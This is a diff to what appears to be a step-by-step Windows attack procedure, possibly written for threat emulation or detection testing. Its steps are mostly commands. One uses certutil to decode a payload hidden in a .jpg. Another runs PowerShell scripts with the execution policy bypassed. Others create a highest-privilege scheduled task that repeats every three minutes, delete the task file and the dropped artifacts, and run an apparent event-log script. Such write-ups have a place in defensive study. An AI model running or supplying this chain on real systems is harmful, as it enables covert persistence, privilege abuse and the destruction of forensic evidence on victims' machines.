@@ -21,7 +21,7 @@ certutil -decode amanwhogetsnorest.jpg normal.zip 1>nul
 <pre>
 cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\z.ps1"
 </pre>
-4. Created a scheduled  \whoisthebaba
+4. Created a scheduled task  \whoisthebaba
 <pre>
 schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST
 </pre>
@@ -37,11 +37,15 @@ del amanwhogetsnorest.jpg
 <pre>
 del normal.zip 
 </pre>
-8. Open CMD to run Eventlog.ps1 from PowerShell
+8. Deleted the scheduled task  \whoisthebaba
+<pre>
+del c:\Windows\system32\Tasks\whoisthebaba
+</pre>
+9. Open CMD to run Eventlog.ps1 from PowerShell
 <pre>
 cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\Eventlog.ps1"
 </pre>
-9. Deleted Eventlog.ps1
+10. Deleted Eventlog.ps1
 <pre>
 del Eventlog.ps1
 </pre>
